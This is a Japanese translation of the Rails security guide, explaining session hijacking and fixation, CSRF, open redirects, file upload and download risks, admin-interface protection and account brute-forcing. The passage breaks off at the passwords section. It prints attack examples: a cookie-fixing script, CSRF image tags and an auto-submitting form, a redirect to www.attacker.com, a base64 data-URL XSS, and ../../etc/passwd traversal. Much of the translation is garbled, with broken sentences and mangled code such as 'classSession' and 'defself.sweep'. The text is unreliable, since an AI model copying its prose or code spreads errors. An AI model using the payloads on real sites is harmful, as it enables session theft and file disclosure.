翻訳者：長山裕一
確認者：内川貴雄
 
Ruby on Rails のセキュリティ ガイド
このマニュアルでは、web アプリケーションで一般的なセキュリティ問題と回避する方法をについて説明します。

このガイドを読んだ後、理解できること：

*すべての対策が強調表示されます
*Railsの概念で人気な攻撃方法や何を入れるべきかということ
*サイトを訪問だけで、どのようにセキュリティの問題 (CSRF) が起こるか
*注意を払う必要があるファイルでの作業または管理インターフェイスを提供
*ユーザーを管理する方法: ログアウトと攻撃のすべてのレイヤーのメソッド
*最も人気のあるインジェクション攻撃方法

!1 概要
Web アプリケーション フレームワークは、開発者が web アプリケーションを構築できるように作られています。それらのいくつかはまた、web アプリケーションのセキュリティ保護を助けます。実際、1つのフレームワークは別のものほど安全ではありません： あなたがそれを正しく使用する場合は、多くのフレームワークとセキュリティで保護されたアプリケーションを構築できるようになります。これはほとんどの問題ですので、ruby on Railsは SQL インジェクションに対してたとえばいくつかの有能なヘルパー メソッドがあります。私がみたRailsがすべてよいレベルのセキュリティをしていたというのをみたい。

一般的に、plug-n-playのセキュリティのようなものはありません。セキュリティはフレームワークを使用している人々と開発方法によって異なります。そしてWeb アプリケーション環境のすべてのレイヤーに依存します: バックエンドストレージ、web サーバーと webアプリケーション自体 (とおそらく他のレイヤーまたはアプリケーション)。

ガートナー・グループは、攻撃の75%がウェブ・アプリケーション層にあると推測するし「300の監査されたサイトから、97%は攻撃に対して脆弱」とみつけた。これは、それらの理解および操作が簡単なように、ウェブ・アプリケーションが攻撃するのが一般人によってさえ、比較的簡単であるからです。

Web アプリケーションに対する脅威は、読み取りまたは機密性の高いデータを変更または不正なコンテンツを提示するアクセス制御やユーザーアカウントの乗っ取りなどがあります。攻撃者は、ソフトウェアを送るトロイの木馬のプログラムか迷惑メールをインストールすることができ、あるいはお金稼ぎをすることができるかもしれない、もしくは、会社資源の修正により商標損害を引き起こすことができるかもしれません。
第一に、攻撃を防ぎ、それらの影響を最小化し、攻撃のポイントを削除するために、完全に正確な対抗策を見つけるために攻撃方法を理解しなければなりません。
それはこのガイドが目指すものです。

セキュリティで保護された web アプリケーションを開発するために敵を知っている必要があります。セキュリティのメーリング リストの購読やセキュリティのブログなどのチェックの習慣などが好ましいです。(http://edgeguides.rubyonrails.org/security.html#additional-resources)。厄介なセキュリティの問題を見つけるため手動で行います。

!2 セッション
特定の攻撃を受けやすいセッションがセキュリティを始める上でいいところでしよう。

!!2.1 セッションとは？
""HTTP はステートレスなプロトコルです。セッションはステートフルにします。

ほとんどのアプリケーションは、特定のユーザーの特定の状態を追跡する必要があります。これは、買い物カゴの内容または現在ログインしているユーザーのユーザー id のことです。セッションのアイデアなしでは、おそらくすべてのリクエストで、認証が必要になります。Railsでは、新しいユーザーは、アプリケーションにアクセスする場合、新しいセッションが自動的に作成されます。ユーザーがアプリケーションを既に使用している場合、既存のセッションを読み込みます。

セッションは通常の値とハッシュを識別するために、32 文字の文字列、セッション id のハッシュで構成されます。クライアントのブラウザーに送信されるすべてのクッキーにはセッション id が含まれています。他の方法: ブラウザーはリクエストごとにサーバーにクライアントから送信されます。Railsで保存し、セッションメソッドを使用して値を取得することができます。

<<<
session[:user_id] = @current_user.id
User.find(session[:user_id])
>>>

!!2.2 セッション id
""セッション id は、32 バイト MD5 ハッシュ値です。

セッション id はランダムな文字列のハッシュ値で構成されています。ランダムな文字列は、現在の時刻は、0 と 1、Ruby インタプリタ (また基本的にランダムな番号) と定数文字列のプロセス id 番号でなるのランダムな番号です。現在、総当りではRailsのセッション id は不可能です。現在まで、MD5は危険にさらされませんでした。しかし、衝突がありました。したがって、同じハッシュ値で別の入力テキストを作成することは理論上可能です。
しかし、これには現在までセキュリティ・インパクトがありませんでした。

!!2.3 セッション ハイジャック
""他者のセッションidを攻撃者に盗ませることは被害者の名前でWebアプリケーションを使うことになります。

多くの web アプリケーションの認証システムがある: ユーザーにユーザー名とパスワードを提供し、web アプリケーションは、それらをチェックし、セッションのハッシュに対応するユーザー id を格納します。ここから、セッションは有効です。要求ごとに、アプリケーション セッションでは、新しい認証を必要とせず、ユーザー id によって識別されるユーザーをロードします。クッキーにあるセッションidはセッションを識別します。

したがって、cookie は web アプリケーションの一時的な認証として機能します。誰もが他の誰かからクッキーを握る可能性があります。このユーザーとして、おそらく深刻な影響を与えます。ここでは、セッションのハイジャックとその対策がいくつかあります。

*安全でないネットワークでクッキーの盗聴。無線 LAN は、このようなネットワークの例をすることができます。暗号化されていない無線 LAN ですべて接続しているクライアントのトラフィックを読むことは特に簡単です。これは、コーヒー ショップから仕事をしないと、もう一つの理由があります。Web アプリケーション ・ ビルダーのつまりSSL をセキュリティで保護された接続を提供します。Rails 3.1 と後に、常にアプリケーションの構成ファイルで SSL 接続を強制することによってこれを達成することができます。
<<<
config.force_ssl = true
>>>
*ほとんどの人は、公共の端末での作業の後クッキーを削除しません。Web アプリケーションから、最後のユーザーがログアウトしていない場合は、あなたはこのユーザーとして使用することができるでしょう。Webアプリケーションでログアウトボタンを設置することはそれを顕著にします。

*多くクロス サイト スクリプティング (XSS)はユーザーの cookie を取得するし悪用します。ここで説明しています http://edgeguides.rubyonrails.org/security.html#cross-site-scripting-xss

*攻撃者に知られていないクッキーを盗む代わりに、彼を知るためにユーザのセッションidを（クッキーの中で）修正します。後でこのいわゆるセッション定着に関してもっと読んでください。

ほとんどの攻撃者の主な目的はお金を稼ぐことです。盗まれた銀行ログインアカウントは地下価格 $10から $1000 (資金による)、クレジット カード番号は $0.40 から$20、ンライン オークション サイトのアカウントは$1から$8、メールアドレスとパスワードは$4から$30というデータがシマンテック グローバル インター ネット セキュリティ脅威レポートから出ています。http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf

!!2.4 セッションのガイドライン
ここにはセッションのいくつかの一般的なガイドラインがあります。

*セッションで大きなオブジェクトを格納しません。代わりにそれらをデータベースに格納し、id でセッションを保存する必要があります。これは、同期問題を除去して、セッション集積スペースを満たさないでしょう(あなたがどのセッション記憶装置を選んだかに依存。下に参照)。もしあなたがオブジェクトの構造を修正し、その古いバージョンがまだどこかのユーザのクッキーにあれば、これはよい考えになるでしょう。サーバーサイドのセッション記憶装置で、あなたはセッションを取り除くことができます。しかし、クライアント側記憶装置で、これは緩和するのが難しいでしよう。

*重要なデータをセッションに保管しないでください。ブラウザーを閉じるユーザーがクッキーをクリアすればそのデータを失います。クライアント サイドのセッション ストレージでは、ユーザーのデータを読むことができます。

!!2.5 セッション ストレージ
""Railsは、セッションのハッシュのいくつかのストレージ メカニズムを提供します。最も重要なのはActionDispatch::Session::CookieStoreです。

Rails 2ではデフォルトでクッキーストアという新しいセッションストレージがあります。クッキーストアはクライアント側のクッキーに直接ハッシュとしてセッションを保存します。サーバーは、セッションのハッシュからクッキーを取得、セッション id の必要がなくなります。大幅に、アプリケーションの速度が向上しますが、それは論争の的になっている格納選択です。また、そのセキュリティ含意に関して考えなければなりません:

*クッキーは、厳密なサイズ 4 kB の制限を意味します。これは、前に説明したように大量のデータを保存しないようにです。現在のユーザーのデータベース id、セッションに格納するは通常 ok です。

*クライアントはセッションにあるストアをすべて見ることができる。それは、平文で格納されているからです（暗号化ではなく、Base64エンコード）。だから、もちろん、ここで任意の機密情報を格納しようとは思いません。セッション・ハッシュを不正に変更することを防ぐために、要約はサーバーサイドの秘密を持ったセッションから計算され、クッキーの最後に挿入されます。

それは格納庫のセキュリティはこの秘密に依存しております（デフォルトのSHA512はまだ信用されていない）。なので、些細な秘密では使わないでください：辞書からの単語、もしくは、30文字以内の文字

config.secret_key_baseはキーを明確化するのに使われ、改ざんを防ぐため、検証済みの安全なキーでセッションを許可します。config/initializers/secret_token.rbでランダムなキーをconfig.secret_key_baseで手に入れます。
<<<
YourApp::Application.config.secret_key_base = '49d3f3de9ed86c74b94ad6bd0...'
>>>

EncryptedCookieStoreで使われるsecret_key_baseの代わりにsecret_tokenを使う古いバージョンのRailsはクッキーストアを使います。もっと情報を手に入れるには最新のドキュメントを読んでください。

もし晒された秘密のアプリケーションを受け取ったなら、秘密を変えることを強く考えてください。

!!2.6 クッキーストアセッションのリプレイ攻撃
""クッキーストアを使うと攻撃のされるという意識が必要で、別な種類の攻撃でリプレイ攻撃というものです。

それはこのように動作します：

*ユーザはクレジットを受け取り、その量はセッションに格納されている。（しかしそれはあまりいい考えではないが、デモの意味で私たちはこのようにします）
*ユーザは何かを購入する
*彼は新しく、低いクレジットをセッションに格納されるでしよう。
*悪い方のユーザは彼に最初の段階（こぴーされた）でクッキーをとるように強制し、ブラウザで現在のクッキーと置き換えます。
*ユーザは彼のクレジットを取り戻す

このセッションでリプレイ攻撃を解決するためその場限り（ランダムな値）のものを含めます。それは一度だけ検証され、そして、サーバはそれらすべてを追っていく必要があります。もし複数のアプリケーションサーバがあれば、より複雑になるでしよう。それをデータベースに格納していくことはクッキーストアの全体の目的を覆すでしよう（データベースにアクセスするのを避ける）。

このことに対する最もよい解決方法はセッションにこのようなデータを入れずにデータベースに入れることです。この場合、クレジットをデータベースに格納しlogged_in_user_idをセッションに入れます。

!!2.7 セッション固定化

""ユーザのセッションidを盗むことから離れ、攻撃者は他者を知るためセッションidを固定するかもしれません。これはセッションの固定化と呼ばれます。

この攻撃は攻撃者を知るためユーザのセッションidを固定することに焦点をあて、そしてこのidを使用することによりユーザのブラウザを強制します。その結果、攻撃者にとって後でセッションidを盗む必要がなくなります。下記はどのように攻撃が働くかを示します：

*攻撃者は有効なセッションidを作成します：彼ははセッションを固定したいところのログインページをロードし、レスポンスのクッキーからセッションidを抜き取ります（図の1と2です）。
*彼はセッションを維持することができます。例えば20分という期限があるセッションでは攻撃される時間を短くできます。それ故に彼はセッションを死なせないように時々Webアプリケーションにアクセスします。
*そしてこのセッションidを使うことにより攻撃者はユーザのブラウザを強制できます（図の3）。別のドメインのクッキーを変えないかもしれないが（もとの決まりにより）、攻撃者はターゲットとしているWebアプリケーションのドメインからJavaScriptを走らせます。この攻撃をするためXSSによりJavaScriptのコードをアプリケーションに入れます。次が例となります：
<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>
XSSのことはあとで説明します。
*攻撃者はJavaScriptコードが埋め込まれているページに犠牲者を誘導します。このページをみることにより、犠牲者のブラウザのセッションidはトラップのセッションidに変わります。
*こうして新しいトラップのセッションidが使えなくなると、Webアプリケーションはユーザに認証を求めます。
*ここから、攻撃者と犠牲者が同じセッションでWebアプリケーションを使うこととなります：セッションは有効となり犠牲者は攻撃に気づきません。


!!2.8 セッション固定化-対策
""一行のコードがセッション固定化から守ります。

最も良い対策は新しいセッションidを問題とし、成功したログインの後の無効なものを宣言することです。この方法は、攻撃者は固定したセッションidを使うことができなくなります。これはセッションハイジャックに対してよりよい対策です。次のものはRailsで新しいセッションをつくる方法です：
<<<
reset_session
>>>

もしあなたが人気なRESTフルな認証プラグインでユーザを管理している場合、SessionsController#createにreset_sessionを追加してください。セッションから値を消す時、新しいセッションに移動する必要があるということを注意してください。

他の対策はセッションにユーザ特有のプロパティを保存し、もし情報が当てはまらなかったら、アクセスを拒否するなどリクエストごとに検証するというやり方です。このようなプロパティはリモートIPアドレスだったりUA（ブラウザ名）だったりします。後者はユーザ特有ではありません。IPアドレスを保存する際、プロバイダや大きな組織がプロキシを使っているということを覚えておいてください。これらはセッションのコースを変える可能性があるので、この人達はアプリケーションを利用できなくなったり、制限されたりします。

!!2.9 セッションの有効期限

""期限のないセッションはクロスサイトリクエストフォージェリ(CSRF)やセッションハイジャック、セッション固定かのような攻撃の時間を伸ばします。

一つの可能性はセッションidと一緒にクッキーに期限のあるタイムスタンプをセットすることです。クライアントはWebブラウザに格納されているクッキーを編集できるので、期限のあるセッションはサーバを安全にします。次はデータベーステーブルでどう期限のあるセッションにするかの例です。Call Session.sweep("20 minutes")は20分以上のセッションを期限切れにします。

<<<
classSession < ActiveRecord::Base
  defself.sweep(time =  1.hour)
    iftime.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end
 
    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
end
>>>

セッション固定化のセッションはセッションの維持の問題を表します。セッションが切れていても攻撃者は5分毎にセッションを死なせないようにしています。これに対するシンプルな対策はcreated_atカラムをセッションテーブルに追加することです。そしたら昔作られたセッションを消すことができます。次の行を使い一掃できます：
<<<
delete_all "updated_at < '#{time.ago.to_s(:db)}'OR
  created_at < '#{2.days.ago.to_s(:db)}'"
>>>

!3 クロスサイト リクエスト フォージェリ (CSRF)

この攻撃は魔法のようなコードを含むことや認証が必要なWebアプリケーションにリンクしてアクセスすることにより働きます。もしセッションのタイムアウトがWebアプリケーションに無ければ、攻撃者は非認証されたコマンドが使われるかもしれません。


セッションの章で学んだことはほとんどのRailsアプリケーションはクッキーベースのセッションが使われているということです。セッションidをクッキーに格納してサーバ側でセッションハッシュを持っている、もしくは、クライアント側ですべてのセッションハッシュを持っているかのどちらかです。どちらの場合にせよ、そのドメインでクッキーが見つかり次第、すべてのリクエストにクッキーを自動的に送ります。この議論のポイントは、違うドメインからのリクエストでもクッキーを送ってしまうという点です。例をみてみましよう：



*ボブ、メッセージ ボードを参照し、ハッカーからの投稿をビューに細工された HTML イメージ要素が。要素では、イメージ ファイルではなく、ボブのプロジェクト管理アプリケーションは、コマンドを参照します。
*<img src="http://www.webapp.com/project/1/destroy">
*彼は数分前にログインしていないためwww.webapp.comでボブのセッションがまだ生きています。
*ポストを表示すると、ブラウザーは画像タグを検索します。それwww.webapp.comから疑いイメージをロードしようとします。前に説明したように、有効なセッション id をクッキーに沿っても送信されます。
*www.webapp.comは、web アプリケーションでセッションの対応するハッシュのユーザー情報を検証し、ID 1 にプロジェクトを破壊します。これは、後、イメージは表示されませんので、ブラウザーは、予期しない結果結果のページを返します。
*ボブ doesn't 攻撃に注意してください ― 数日後で、プロジェクト数 1 つ知りますが消えているが。
実際に細工された画像またはリンク必ずしも、web アプリケーションのドメイン内に位置する必要はありません、それがどこでも-をすることができますフォーラム、ブログや e メールでお知らせすることが重要です。

CSRF は非常にまれに CVE (一般的な脆弱性およびエクスポー ジャー) が表示されます ― 2006 年 0.1 ％ 未満-それは本当に '眠れる巨人' [グロスマン]。これは、結果にはまったく対照的である私 (その他) セキュリティの仕事- CSRF、重要なセキュリティ上の問題です.

!!3.1 CSRF 対策
""まず、W3C によって必要な GET と POST を適切に使用します。第二に、非 GET 要求でセキュリティ トークンは CSRF からアプリケーションを保護します。

HTTP プロトコルは基本的には要求 - GET と POST の 2 つの主な種類を提供しています （と詳細は、しかし、彼らはほとんどのブラウザーではサポートされていません)。World Wide Web コンソーシアム (W3C) には、HTTP GET または POST を選択するためのチェックリストが用意されています。

取得を場合使用します。

*相互作用のような質問ですすなわち、クエリなどの安全な操作は、読み取り操作 (を参照)。
記事を場合は使用します。

相互作用はより多くのような順序、または
*相互作用、状態変更のユーザーを認めるだろう方法でリソース （例えば、サービス サブスクリプション） または
*ユーザーの相互作用の結果の責任です。
Web アプリケーションが restful である場合は、パッチ、置くまたは削除などの他の HTTP 動詞に使用される可能性があります。今日の web ブラウザーのほとんどしかしサポートしていませんが GET と POST のみ。レール隠された_methodフィールドを使用して、この障壁を処理します。

POST 要求はあまりにも自動的に送信することができます。ここでは、ブラウザーのステータス バーの地としてwww.harmless.comが表示されますリンクの例です。実際には、動的に POST 要求を送信する新しいフォームを作成します。

<<<
<a onclick="
  var f = document.createElement('form');
  f.style.display = は'none';
  this.parentNode.appendChild(f);
  f.method =  'POST';
  f.action =  'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
>>>
または、攻撃者はコード イメージの onmouseover イベント ハンドラーに配置。

<<<
<imgsrc="http://www.harmless.com/img"width="400"height="400"onmouseover="..." />
>>>
バック グラウンドで犠牲者を攻撃するために Ajax を含んで他の多くの可能性があります。サーバー側で確認してください、これを解決する非 GET 要求でセキュリティ トークンを含むです。レール 2 以上では、このアプリケーションのコント ローラーで 1 つのライナーです。
<<<
protect_from_forgery secret: "123456789012345678901234567890…"
>>>
これは自動的に、セキュリティ トークンが含まれます、現在のセッションとサーバー側の秘密は、すべてのフォームと Ajax リクエストによるレールを生成から計算されます。CookieStorage セッション ストレージとして使用する場合、秘密を必要ありません。セキュリティ トークンは、予期されたものと一致しない場合は、セッションがリセットされます。注:レール バージョン 3.0.4 より前で、このActionController::InvalidAuthenticityTokenエラーが発生します。

たとえばcookies.permanentでのユーザー情報を格納する永続的な cookie を使用するが一般的です。この場合、クッキーはクリアされずのうち、CSRF 保護ボックスは有効になりません。この情報は、セッションとは異なる cookie ストアを使用している場合は、自分でそれを処理する必要があります。
<<<
def handle_unverified_request
  super
  sign_out_user # Example method that will destroy the user cookies.
end
>>>

上記の方法でApplicationControllerを配置することができます、CSRF トークンが非 GET 要求に存在しない場合に呼び出されます。

そのすべての CSRF 保護クロス サイト スクリプティング (XSS) の脆弱性をバイパスに注意してください。彼は CSRF セキュリティ トークンをフォームから読み取るまたは直接フォームを送信できるように XSS は、ページ上のすべての要素に、攻撃者にアクセスを提供します。XSS の詳細は後で読みます。

!4 リダイレクトとファイル
セキュリティの脆弱性の別のクラスのリダイレクトおよび web アプリケーション内のファイルの使用を囲みます。

!!4.1 リダイレクト
""Web アプリケーションでのリダイレクトは過小評価のクラッカー用具である: だけでなく前方の攻撃者はユーザーをトラップ web サイトすることができます、彼はまた、自己完結型の攻撃を作成することがあります。

たびに、ユーザーは (の一部) を渡すことができます URL のリダイレクトを可能性がある脆弱性です。最も明白な攻撃が見えるし、まったくオリジナルのものとして感じている偽の web アプリケーションにユーザーをリダイレクトすることです。このいわゆるフィッシング攻撃は疑わしくないリンクをメールで送信するユーザー、web アプリケーションの XSS でリンクを注入することまたは、外部のサイトにリンクを置くことによって動作します。Web アプリケーションへの URL リンクで始まるし、する悪意のあるサイトの URL にリダイレクト パラメーターは非表示ですので怪しいです： http://www.example.com/site/redirect?to= www.attacker.com。ここでは、旧形式のアクションの例です：
<<<
deflegacy
  redirect_to(params.update(action:'main'))
end
>>>
彼は legacy アクションにアクセスしようとした場合この main アクションにユーザーをリダイレクトします。意図は、旧形式のアクションに URL パラメーターを維持し、それらに主なアクションを渡すことでした。しかし、それすることができます悪用が攻撃者によって彼は URL では、ホスト キーが含まれる場合。
<<<
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
>>>
URL の末尾の場合ほとんど注目され、ユーザーが attacker.com のホストにリダイレクトします。単純な対策は、旧形式のアクションで予測されるパラメーターのみを含める(予期しないパラメーターを削除するのではなくもう一度、ホワイト リスト アプローチ) することです。URL にリダイレクトする場合それはホワイト リストと、正規表現をチェック.

!!!4.1.1 自己完結型 XSS

もう一つのリダイレクトと自己完結型 XSS 攻撃データ プロトコルを使用する Firefox と Opera の作品。このプロトコルは、その内容をブラウザーで直接表示し、何か HTML または JavaScript から全体のイメージにすることができます。

data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

次の使用例は、単純なメッセージ ボックスが表示されます JavaScript、Base64 エンコードされたです。リダイレクト URL には、攻撃者はこの URL には悪意のあるコードにリダイレクトできます。対策として（の一部） を供給するユーザーを許可しないにリダイレクトされる URL.

!!4.2 ファイルのアップロード
""ファイルのアップロードしない重要なファイルを上書きしてメディア ファイルを非同期的に処理を確認してください。

多くの web アプリケーションでは、ファイルをアップロードするユーザーことができます。悪意のあるファイル名として攻撃者は、ユーザーが (部分的に) を選択可能性があります、ファイル名が常にフィルターする必要があります、サーバー上のファイルを上書きできます。ファイルのアップロード/var/www/uploads で格納し、ユーザーがファイル名のような入力かどうか"./../../etc/passwd"、それが重要なファイルを上書き可能性があります。もちろん、Ruby インタプリタ-そう適切なアクセス許可必要がありますもう一つの理由として以下の web サーバー、データベース サーバーや他のプログラムを実行する権限の Unix ユーザ。

ユーザー入力ファイル名、悪意のある部分を削除しようとしていないフィルター処理する場合。ここで web アプリケーションを削除しますすべての状況を考える」./"でファイル名と、攻撃者は文字列を使用よう"...//"-結果になります"./”.ホワイト リストのアプローチは、どの文字のセットを持つファイル名の妥当性のチェックを使用することをお勧めします。これは削除の試みの文字できませんブラック リスト アプローチに反対しています。有効なファイル名ではない場合に、それ (またはない受け入れ置換文字)、拒否するが、それらを削除しないでください。ここではファイル名消毒attachment_fu プラグインから

<<<
defsanitize_filename(filename)
  filename.strip.tap do|name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
>>>

ファイルの同期処理の不利な点は (attachment_fu プラグインのイメージで行うことがありますように） をアップロード、そのサービス拒否攻撃に対する脆弱性です。攻撃者は、サーバーの負荷が増加する可能性があります最終的にクラッシュや、サーバーを停止する多くのコンピューターから画像ファイルのアップロード同期的に起動することができます。

メディア ファイルを非同期的に処理するために最適なこのソリューション: メディア ファイルを保存し、データベース内の要求の処理をスケジュールします。2 番目のプロセスはバック グラウンドでファイルの処理を処理します。

!!4.3 実行可能コードのファイルをアップロードします。
""アップロードされたファイル内のソース コードは、特定のディレクトリに置かれたとき実行可能性があります。ファイルのアップロードでレールの/public を配置しない場合は Apache のホーム ディレクトリのディレクトリ。

人気のある Apache web サーバーは DocumentRoot と呼ばれるオプションがあります。これは、web サイトのホーム ディレクトリは、このディレクトリ ツリー内のすべて、web サーバーによって提供されます。特定のファイル名拡張子を持つファイルがある場合、コードは要求されたときが実行されます (いくつかのオプションを設定する必要があります)。この例としては PHP および CGI ファイルです。今、ファイル"file.cgi"誰かがファイルをダウンロードするときに実行されるコードは、攻撃者をアップロード状況を考えます。

Apache DocumentRoot レールの/public を指している場合はディレクトリ、ファイルのアップロードは配置しないでください、ストア ファイルには、少なくとも 1 つのレベルの下。

!!4.4 ファイルのダウンロード
""ユーザーが任意のファイルをダウンロードできないことを確認します。

ちょうどアップロード ファイル名をフィルター処理する必要があるように、そうのダウンロードを行う必要があります。Send_file() メソッドのファイルをサーバーからクライアントに送信します。フィルター処理なしで、ユーザーが入力したファイル名を使用する場合任意のファイルをダウンロードすることができます。
<<<
send_file('/var/www/uploads/' + params[:filename])
>>>
単に渡すファイル名のような"./../../etc/passwd」サーバーのログイン情報をダウンロードします。これに反し、シンプルなソリューションです要求されたファイルを予想されたディレクトリーであることを確認するには:
<<<
basename = File.expand_path(File.join(File.dirname(__FILE__),  '../../files'))
filename = File.expand_path(File.join(basename,  @file.public_filename))
raiseifbasename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'
>>>
(追加の) ファイル名をデータベースに格納して、ディスク上のファイルの id、データベースで名前をこともできます。これはまた実行するアップロードされたファイルで可能なコードを避けるために良い方法です。Attachment_fu プラグイン同様の方法でこれをします。

!5 イントラネットおよび管理者のセキュリティ
彼らへの特権アクセスを許可するイントラネットおよび管理インターフェイスの普及攻撃のターゲットです。このいくつかの extra-security 対策が必要になりますが、逆は、現実の世界においてです。

2007 年には、イントラネット、すなわち、Monster.com の「モンスター」雇用者のための web サイト、オンライン求人 web アプリケーションからの情報を盗んだ最初オーダーメイド トロイの木馬があった。オーダーメイドのトロイの木馬これまでのところ、非常にまれな、リスクはかなり低いですが、確かに可能性がどのようにクライアント ・ ホストのセキュリティも重要なの例です。ただし、イントラネットと管理者アプリケーションへの最大の脅威は、XSS と CSRF です。

XSS悪意のあるユーザー入力、エクストラネットから、アプリケーションを再する場合は、アプリケーションが XSS に対して脆弱になります。ユーザー名、コメント、スパムのレポートは、注文のアドレスは、いくつかの珍しい例が XSS することができます。

1 つの場所は入力にサニタイズされていない、イントラネットの管理インターフェイスを持つアプリケーション全体脆弱になります。可能性を悪用特権を持つ管理者の cookie を盗む、管理者のパスワードを盗むために iframe を注入することが管理者のコンピューターをブラウザーのセキュリティ ホールを介して悪意のあるソフトウェアをインストールするあります。

XSS 対策の注入を参照してください。それはまたイントラネットまたは管理インターフェイスではSafeErb プラグインを使用することを推奨です。

CSRFクロス サイト参照フォージェリ (CSRF) の巨大な攻撃方法は、管理者またはイントラネットを尽くすために攻撃できるユーザーが行うことができます。CSRF のしくみ上をすでに見ているように、ここに攻撃者がイントラネットまたは管理者インターフェイスで何ができるのいくつかの例です。

実世界の例は、ルーターの再構成 CSRF によってです。攻撃者は悪意のある電子メールは、CSRF をメキシコのユーザーに送信されます。電子メールには、e カードそれらを待っていたが、それも （これはメキシコで人気のあるモデル） はユーザーのルーターを再構成する HTTP GET 要求の結果、画像タグに含まれていると主張しました。要求で DNS 設定を変更して、メキシコ ベースの銀行のサイトへの要求が攻撃者のサイトにマップされます。誰もが銀行のサイトにアクセスしてそのルーターを攻撃者の偽の web サイトを見て、彼の資格情報が盗まれていた。

別の例は、Google Adsense の電子メール アドレスとパスワードで変更します。犠牲者 Google Adsense は、Google の広告キャンペーンの管理インターフェイスに記録されている場合、攻撃者は彼の資格情報を変更できます。

別の人気のある攻撃スパムの web アプリケーションをあなたのブログやフォーラムを悪質な XSS を伝達することです。もちろん、攻撃者が URL 構造を知っているが、ほとんどのレールの Url は非常に簡単ですまたはオープン ソース アプリケーションの管理インターフェイスの場合、彼らを見つけることは容易になります。攻撃者はちょうどあらゆる組み合わせを試す悪意のある IMG タグを含めることにより 1,000 推測幸運も行うことができます。

は、管理インターフェイスとイントラネット アプリケーション、CSRF 対策を参照してください] セクションで、CSRF 対策に.

!!5.1 追加の予防策
共通の管理インターフェイスがこのように動作します： それはwww.example.com/adminである、管理者フラグでユーザー モデルに設定されている場合は、re-displays ユーザー入力でき管理者削除/追加/編集に必要などのようなデータだけにアクセス可能性があります。これについてのいくつかの考えを以下に示します。

*それは最悪のケースについて思うこと非常に重要です： どのような場合誰かが本当に私の cookie またはユーザーの資格情報のホールドを得た。攻撃者の可能性を制限するには、管理インターフェイスの役割を導入できます。または管理インターフェイスをアプリケーションの公開部分を使用する以外の方法について特別なログイン資格情報。または非常に深刻なアクションの特別なパスワード?

*管理者は本当にどこからインターフェイスにアクセスするが、世界でですか？発信元 IP アドレスの束へのログインを制限することについてだと思います。ユーザーの IP アドレスを調べる request.remote_ip を確認します。これは弾丸の証拠ではありませんが大きな障壁。ある可能性がありますが、プロキシ使用では、しかし覚えています。

*特別なサブドメインへの管理インターフェイスを置くadmin.application.com など、別のアプリケーション独自のユーザー管理をして。これwww.application.com、不可能、通常のドメイン管理者クッキーを盗みます。これは、同一生成元ポリシーお使いのブラウザーのためです： www.application.com注入 （XSS） スクリプト admin.application.com と逆のためクッキーを読み取らないことがあります。

!6 ユーザ管理
""ほぼすべての web アプリケーションは、承認と認証を扱う必要があります。独自の圧延ではなく、一般的なプラグインを使用することをお勧めします。しかし、あまりにもそれらを最新の状態で保ちます。いくつかの追加の予防策、アプリケーションはさらに安全なことができます。

レールの認証プラグインの数が利用可能です。良いもの、人気のある工夫 authlogicなどストアのみいないプレーン テキスト パスワード暗号化。レール 3.1 で似たような機能が組み込みのhas_secure_passwordメソッドを使用できます。

すべての新しいユーザーは、彼は電子メールのリンクを取得すると自分のアカウントをアクティブにするアクティベーション コードを取得します。アカウントをアクティブ化した後、activation_code 列は、データベースに NULL に設定されます。誰かがこれらのような URL を要求した場合、彼がデータベースで見つかった最初のアクティブ化されたユーザーとして記録されるだろう （とチャンスは、この管理者です）：
<<<
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
>>>
これが不可能なのでいくつかのサーバは、このようにパラメーター id パラメーターと同様に [: id]、nil になります。しかし、ファインダーのアクティブ化アクションからここで：
<<<
User.find_by_activation_code(params[:id])
>>>
パラメーターが nil ならば、結果として得られる SQL クエリになります
<<<
SELECT* FROMusers WHERE(users.activation_code  IS NULL) LIMIT 1
>>>
したがってそれは、最初のユーザーがデータベースに見つかりませんそれを返され彼ログインします。あなたそれについての私のブログの記事で調べることができます。あなたのプラグインに時間から時間を更新することをお勧めです。さらに、このようなより多くの欠陥を見つけるにあなたのアプリケーションを確認できます。

!!6.1 総当たりアカウント
""アカウントに対するブルート フォース攻撃の試行錯誤攻撃のログイン資格情報です。それらをより汎用的なエラー メッセージをかわすし、可能性は、CAPTCHA を入力する必要があります。

ほとんどの人は高度なパスワードを使用しないため、web アプリケーションのユーザー名の一覧が対応するパスワードをブルートフォースを悪用かもしれません。ほとんどのパスワードと辞書にある単語の組み合わせ可能性の数字です。ユーザー名と、辞書の一覧で、武装、自動プログラムが正しいパスワードをほんの数分でがあります。

これらのいずれかが正しくない場合このため、ほとんどの web アプリケーションを「ユーザー名またはパスワードが正しくありません」の一般的なエラー メッセージ表示されます。「入力したユーザー名がされていない」としている場合は、攻撃者は自動的にユーザー名一覧をコンパイルできません。

ただし、デザイナーを無視、どのようなほとんどの web アプリケーションのパスワードを忘れた場合のページです。これらのページは多くの場合が入力したユーザー名または電子メール アドレス () 見つかっていないことを認めています。これは、ブルートフォース、アカウント ユーザー名のリストをコンパイルし、攻撃者ことができます。

などを軽減するために攻撃は、あまりにもパスワードを忘れた場合のページの一般的なエラー メッセージを表示します。さらに、特定の IP アドレスからのログイン失敗数後 CAPTCHA を入力する必要があることができます。ただし、これらのプログラムは正確できるだけ頻繁に IP アドレスを変更するため、弾丸の証拠ソリューションに対して自動プログラムでないことに注意してください。しかし、攻撃の障壁を発生させます。

!!6.2 アカウントの不正使用
多くの web アプリケーションではユーザー アカウントをハイジャックする簡単できます。なぜ異なることし、難しくなるのですか？

!!!6.2.1 パスワード

